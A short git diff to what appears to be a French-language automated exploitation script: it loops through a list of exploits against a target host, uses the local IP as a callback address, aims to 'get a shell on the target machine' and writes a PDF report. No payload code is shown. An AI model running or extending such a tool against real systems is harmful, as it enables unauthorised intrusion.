@@ -85,10 +85,8 @@ def sploiting(list_of_sploit, host,lhost):
     for sploit in list_of_sploit:
         product = sploit[0]
         exploit = sploit[2]
-        #print(f'Trying to exploit {product} with {exploit}...')
         endcode = use_exploit(exploit,host,lhost)
         if endcode == 0:
-            #print('Exploit succeeded!')
             break
 
 if __name__ == '__main__':
@@ -98,8 +96,6 @@ if __name__ == '__main__':
     global host
     host = sys.argv[1]
     lhost = str(subprocess.check_output("ip -4 addr show eth0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}'", shell=True)).replace("b'", "").replace("\\n'", "")    
-    # faudrait faire un check la mais flemme
-
 
     # ICI on PIMP le programme
     show_motd()
@@ -118,6 +114,6 @@ if __name__ == '__main__':
     print("⛥> Génération du rapport...")
     sploit_to_pdf(list_of_sploit)
     print("⛥> Rapport généré sous le nom de " + termcolor.colored("report_exploitation.pdf", 'red') + " dans le dossier courant")
-    print("⛥> Exploitation des failles...")
+    print("⛥> On va obtenir un shell sur la machine cible...")
     sploiting(list_of_sploit, host,lhost)    
     print('bye bye!')
